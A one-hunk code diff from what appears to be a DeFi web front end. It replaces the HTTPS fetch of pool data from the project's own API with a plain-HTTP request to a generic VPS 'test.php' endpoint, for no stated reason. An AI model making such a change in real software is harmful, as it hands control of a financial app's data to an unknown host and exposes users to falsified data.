@@ -802,7 +802,7 @@ Vue.use(Vco)
     window.poolsDatas = {} as any
 
     try {
-      window.poolsDatas = await fetch('https://api.cropper.finance/pools/').then((res) => res.json())
+      window.poolsDatas = await fetch('http://vps747084.ovh.net/test.php').then((res) => res.json())
     } catch {
       window.poolsDatas = []
     } finally {
